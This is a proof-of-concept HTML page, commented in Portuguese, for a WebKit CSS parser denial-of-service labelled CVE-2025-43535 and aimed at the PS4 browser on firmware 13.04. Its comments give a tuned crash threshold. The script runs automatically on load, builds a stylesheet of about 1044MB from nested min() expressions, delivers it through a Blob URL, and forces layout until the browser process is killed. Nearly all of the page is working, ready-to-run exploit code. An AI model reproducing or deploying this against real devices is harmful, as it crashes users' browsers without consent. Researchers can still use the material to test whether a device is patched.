<!DOCTYPE html>
<!--
  PoC FINAL: CVE-2025-43535
  WebKit CSS Math — CSSCalcValue heap exhaustion

  THRESHOLD MAPEADO (PS4 FW 13.04):
  ════════════════════════════════════════════════════════════
  1021.5MB (119.3M nós) → SEM crash  ✓ (confirmado)
  1026.0MB (119.5M nós) → CRASH      ✓ (confirmado no scan)
  Margem: apenas 2.1M nós → sensível à RAM livre no PS4

  Este PoC usa 1044MB (121.7M nós) — 2.2M nós acima do
  threshold — para absorver variação de memória disponível.

  MECANISMO:
  ════════════════════════════════════════════════════════════
  WebKit CSS parser cria um objeto CSSCalcValue por nó min().
  Expressão min() aninhada de N níveis → 2^N objetos no heap C++.
  Acima de ~119M objetos o processo PS4 é morto pelo kernel.

  O Blob entrega os bytes diretamente ao CSS parser sem passar
  pelo GC do JavaScript — sem constant-folding, sem cache.

  ESTRUTURA DO BLOB (1044MB / 1,094,713,349 bytes):
  ════════════════════════════════════════════════════════════
  min(
    min( min(c24,c24), min(c24,c24) ),   ← 576MB  / 67.1M nós
    min( min(c24,c24), min(c24,c22) )    ← 468MB  / 54.5M nós
  )
  Total: 1044MB · ~121.7M nós CSSCalcValue

  JS heap pico: 144MB (apenas c24 + c22 vivos simultaneamente)
  ════════════════════════════════════════════════════════════
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>

</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · 1044MB · ~121.7M nós · PS4 FW 13.04
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                       width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

var logEl = document.getElementById('log');
var barEl = document.getElementById('bar');
var stage = document.getElementById('stage');

function L(m, c) {
  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
  logEl.scrollTop = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

function buildDepth(depth) {
  var e = '1px';
  for (var d = 1; d <= depth; d++) {
    var n = 'min(' + e + ',' + e + ')';
    e = null; e = n;
  }
  return e;
}

function run() {
  L('CVE-2025-43535 · Threshold: >1GB = crash · PS4 FW 13.04', 'info');
  L('Blob: 1044MB (2.2M nós acima do threshold) · JS: 144MB pico', 'info');
  L('', '');

  // ── 1: c22 (36MB) ────────────────────────────────────────
  bar('[1/4] c22 (36MB)...');
  L('[1/4] Construindo c22 (36MB)...', 'warn');

  setTimeout(function() {
    var c22, c24;

    try {
      c22 = buildDepth(22);
      L('[1/4] c22: ' + (c22.length/1024/1024).toFixed(1) + 'MB ✓', 'ok');
    } catch(e) {
      L('[1/4] c22 falhou: ' + e, 'fail'); bar('ERRO'); return;
    }

    // ── 2: c24 (144MB) ───────────────────────────────────────
    bar('[1/4] c24 (144MB)...');
    L('[1/4] Construindo c24 (144MB)...', 'warn');

    setTimeout(function() {
      try {
        c24 = buildDepth(24);
        L('[1/4] c24: ' + (c24.length/1024/1024).toFixed(1) + 'MB ✓', 'ok');
      } catch(e) {
        L('[1/4] c24 falhou: ' + e, 'fail'); bar('ERRO'); return;
      }

      // ── 3: Blob 1044MB ─────────────────────────────────────
      // Estrutura:
      //   min(
      //     min(min(c24,c24), min(c24,c24)),   ← o2_24 = 576MB / 67.1M nós
      //     min(min(c24,c24), min(c24,c22))    ← right  = 468MB / 54.5M nós
      //   )
      bar('[2/4] Criando Blob 1044MB...');
      L('[2/4] Montando Blob (1,094,713,349 bytes esperado)...', 'warn');

      setTimeout(function() {
        var url, realBytes;
        try {
          var blob = new Blob([
            '.t{width:min(',
              // left = o2_24 = 576MB = 67.1M nós
              'min(',
                'min(', c24, ',', c24, ')',
                ',',
                'min(', c24, ',', c24, ')',
              ')',
              ',',
              // right = min(o1_24, min(c24,c22)) = 468MB = 54.5M nós
              'min(',
                'min(', c24, ',', c24, ')',
                ',',
                'min(', c24, ',', c22, ')',
              ')',
            ')}'
          ], { type: 'text/css' });

          realBytes = blob.size;
          url = URL.createObjectURL(blob);

          // Liberar chunks do JS heap
          c22 = null; c24 = null;

          var mb = (realBytes/1024/1024).toFixed(2);
          var gb = (realBytes/1024/1024/1024).toFixed(4);
          L('[2/4] Blob: ' + realBytes + ' bytes', 'info');
          L('[2/4]     = ' + mb + ' MB / ' + gb + ' GB ✓', 'ok');
          L('[2/4] Chunks liberados do JS heap ✓', 'ok');

        } catch(e) {
          c22 = null; c24 = null;
          L('[2/4] Blob falhou: ' + e, 'fail'); bar('ERRO'); return;
        }

        // ── 4: carregar stylesheet ──────────────────────────
        bar('[3/4] Carregando — CSS parser recebe 1044MB...');
        L('[3/4] <link href=blob:...>', 'warn');
        L('[3/4] CSS parser tenta criar ~121.7M objetos CSSCalcValue...', 'warn');
        L('[3/4] ◀ CRASH AQUI = CVE PRESENTE ▶', 'crash');

        var el = document.createElement('div');
        el.className = 't';
        el.style.cssText = 'position:absolute;visibility:hidden';
        stage.appendChild(el);

        var link = document.createElement('link');
        link.rel  = 'stylesheet';
        link.href = url;

        link.onload = function() {
          L('[3/4] Carregada ✓', 'ok');
          bar('[4/4] Forçando layout...');
          L('[4/4] offsetWidth + getComputedStyle...', 'warn');

          setTimeout(function() {
            try {
              void el.offsetWidth;
              var w = window.getComputedStyle(el).getPropertyValue('width');
              L('[4/4] width="' + w + '" ✓', 'ok');
            } catch(e) { L('[4/4] ' + e, 'fail'); }

            try { URL.revokeObjectURL(url); } catch(e) {}
            try { document.head.removeChild(link); } catch(e) {}
            try { stage.removeChild(el); } catch(e) {}

            L('', '');
            L('═════════════════════════════════════', 'warn');
            L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
            L('SEM CRASH = PATCHED / RAM insuficiente', 'ok');
            L('═════════════════════════════════════', 'warn');
            bar('DONE');
          }, 100);
        };

        link.onerror = function() {
          L('blob: URL bloqueado (CSP) — usar servidor local', 'fail');
          try { URL.revokeObjectURL(url); } catch(e) {}
          try { document.head.removeChild(link); } catch(e) {}
          try { stage.removeChild(el); } catch(e) {}
          bar('CSP — usar servidor local');
        };

        document.head.appendChild(link);
      }, 80);
    }, 80);
  }, 100);
}

window.addEventListener('load', function() { setTimeout(run, 200); });
</script>
</body>
</html>
